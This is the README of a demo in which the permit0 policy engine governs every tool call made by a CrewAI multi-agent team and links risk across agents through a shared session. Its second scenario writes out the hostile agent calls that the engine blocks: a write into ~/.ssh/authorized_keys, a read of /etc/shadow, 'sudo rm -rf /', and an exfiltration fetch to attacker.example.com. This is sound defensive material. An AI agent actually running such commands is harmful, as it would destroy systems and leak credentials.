# CrewAI + permit0 — Multi-Agent Session Governance

This demo shows how to wrap a [CrewAI](https://github.com/crewAIInc/crewAI)
multi-agent team with [permit0](../..) so that every tool call flows through a
policy/risk engine *before* the tool runs, and risk accumulates **across
agents** via a shared `permit0.Session`.

## Why session tracking matters

A single compromised agent rarely trips one rule in isolation. Instead it does
*normal-looking* recon on one agent, stages credentials on a second, and pivots
to destruction/exfiltration on a third. Looking at any single call in
isolation is not enough.

`permit0.Session` threads a cumulative history through every
`engine.check_with_session(...)` call so:

1. Individually-catastrophic actions (writes into `~/.ssh/`, `sudo rm -rf`,
   reads of `/etc/shadow`) still get blocked on their own merits.
2. Session-aware rules can additionally see the *pattern* — e.g. recon → SSH
   key staging → privileged destruction → outbound HTTP — and react even if no
   single call would have been blocked alone.

## Architecture

```
        ┌──────────────────────────────────────────────────────────┐
        │                    permit0.Session                       │
        │   (shared record of every tool call across all agents)   │
        └──────────────────────────────────────────────────────────┘
             ▲            ▲             ▲              ▲
             │            │             │              │
        ┌────┴────┐  ┌────┴────┐   ┌────┴────┐   ┌─────┴─────┐
        │Researcher│  │ Writer  │   │ Editor  │   │ Publisher │
        │  Agent  │  │  Agent  │   │  Agent  │   │   Agent   │
        └────┬────┘  └────┬────┘   └────┬────┘   └─────┬─────┘
             │            │             │              │
           tools        tools         tools          tools
       (WebSearch,    (Write,       (Read,         (Bash,
        WebFetch)     Read)         Write)         WebFetch)
             │            │             │              │
             └────────────┴─────────────┴──────────────┘
                                │
                                ▼
              every call → Permit0CrewTool._run(...)
                                │
                                ▼
                 engine.check_with_session(session, tool, params)
                                │
                 ┌──────────────┴──────────────┐
                 │                             │
           Allow / Human                    Deny
                 │                             │
                 ▼                             ▼
           real tool runs            short-circuit with reason
```

## How to run

```bash
# 1. Build the permit0 Python bindings once
cd ../../crates/permit0-py
maturin develop         # or: maturin develop --release

# 2. (Optional) Install crewai — the demo also runs without it via a shim
pip install crewai

# 3. Run the demo (no LLM API keys required)
cd ../../examples/crewai-governed
python main.py
```

The demo does **not** call `Crew.kickoff()` and does **not** require any LLM
credentials. Agent execution is scripted so you can see exactly which tool
calls each agent makes and how `permit0` decides on each one. Replacing the
scripted calls with a real `Crew.kickoff()` is a one-line change once your
agents are wired to the `Permit0CrewTool` instances.

## Expected output

Scenario 1 — normal content pipeline — every tool call is ALLOW:

```
┌─ Scenario 1: Normal Content Creation Crew
├─ [Researcher] WebSearch(query='AI safety trends 2026')
│    permit0: ✓ ALLOW (score=2, minimal) flags=['OUTBOUND']
├─ [Writer] Write(file_path='/tmp/draft.md', content='...')
│    permit0: ✓ ALLOW (score=3, minimal) flags=['MUTATION']
├─ [Editor] Read(file_path='/tmp/draft.md')
│    permit0: ✓ ALLOW (score=2, minimal) flags=['MUTATION']
├─ [Publisher] Bash(command='cp /tmp/final.md /var/www/posts/post.md')
│    permit0: ✓ ALLOW (score=9, minimal) flags=['EXECUTION']
└─
```

Scenario 2 — compromised crew — every dangerous call is blocked, including
the final exfil call which is caught by a **session-level** rule that watches
for outbound traffic AFTER any high/critical decision:

```
┌─ Scenario 2: Compromised Publisher — cross-agent exfil chain
├─ [Researcher] WebSearch(query='company internal docs server')
│    permit0: ✓ ALLOW (score=2, minimal)
├─ [Writer] Write(file_path='/home/user/.ssh/authorized_keys', ...)
│    permit0: ✗ DENY (score=100, critical) — ssh_directory_write
├─ [Publisher] Read(file_path='/etc/shadow')
│    permit0: ✗ DENY (score=100, critical) — system_credential_access
├─ [Publisher] Bash(command='sudo rm -rf /')
│    permit0: ✗ DENY (score=100, critical) — catastrophic_recursive_delete
├─ [Publisher] WebFetch(url='http://attacker.example.com/exfil?data=...')
│    permit0: ✗ DENY (score=100, critical) — post_attack_chain_outbound_block  ← session-level
└─

═══ Audit Summary ═══
  allowed      : 1
  denied       : 4
  flags raised : ['DESTRUCTION', 'EXECUTION', 'EXPOSURE', 'MUTATION', 'OUTBOUND', 'PRIVILEGE']
```

### How the exfil gets caught

The final `WebFetch` has a low intrinsic risk score — a GET to a public URL is
usually Minimal tier. What blocks it is the session's memory of what has
happened on this crew run. Three rules in
[`packs/claude_code/risk_rules/network.yaml`](../../packs/claude_code/risk_rules/network.yaml)
do the heavy lifting:

1. **`post_attack_chain_outbound_block`** (`session_rules` gate) — if the
   session's `max_tier` is ever `HIGH` or `CRITICAL` (from *any* action type,
   not just network), the next outbound call is blocked outright. This is the
   "attack chain memory" for permit0.
2. **`distinct_flags contains_any: [DESTRUCTION]`** — if destructive intent
   has ever surfaced in the session, outbound gets treated as privilege
   escalation (attacker phoning home after trashing things).
3. **`distinct_flags contains_any: [EXPOSURE]`** — credential exposure +
   outbound = classic exfil, so both amplifiers get pushed hard.

These rules use `distinct_flags` which aggregates over *every* prior call in
the session (Write, Read, Bash, HTTP — all of them contribute). The
`max_tier` field does the same for tier. This is how cross-agent, cross-tool
attack chains become visible to a policy engine.

## Production notes

- **Real `Crew.kickoff()` integration.** Each `Permit0CrewTool` already
  inherits from `crewai.tools.BaseTool` when CrewAI is installed, so you can
  pass them directly to a `crewai.Agent(tools=[...])` and call
  `Crew(agents=[...], tasks=[...]).kickoff()`. Keep one `Permit0Session` per
  crew run and inject it into every tool.
- **Human-in-the-loop.** The demo auto-denies `Permission.Human` for
  determinism. In production, route those calls to a Slack/PagerDuty approval
  flow and resume the tool call once signed off.
- **Custom risk rules for content pipelines.** Publish steps are the highest
  blast-radius step in a content crew. Layer a custom risk rule that requires
  `Permission.Human` for any `Bash` call whose command writes outside of the
  draft directory, or for any `WebFetch` that targets a domain outside an
  allowlist.
- **Domain allowlist.** The `trusted_domain` entity on WebFetch is computed by
  the `url_in_allowlist` helper. For production, move the hardcoded list from
  `packs/claude_code/normalizers/web_fetch.yaml` into your org's config and
  reference it as a named set — or integrate with a real URL reputation source
  behind a dedicated helper.
- **Signed audit log.** Wire `permit0.AuditBundle` into `EngineBuilder` to get
  a tamper-evident, ed25519-signed JSONL audit of every crew decision.
- **Session lifetime.** A session represents one crew execution. Don't reuse
  it across unrelated runs or you will get false cross-run correlation.

## Files

- [`main.py`](./main.py) — the demo (two scenarios, scripted crew execution)
- [`requirements.txt`](./requirements.txt) — `crewai` + local `permit0` build
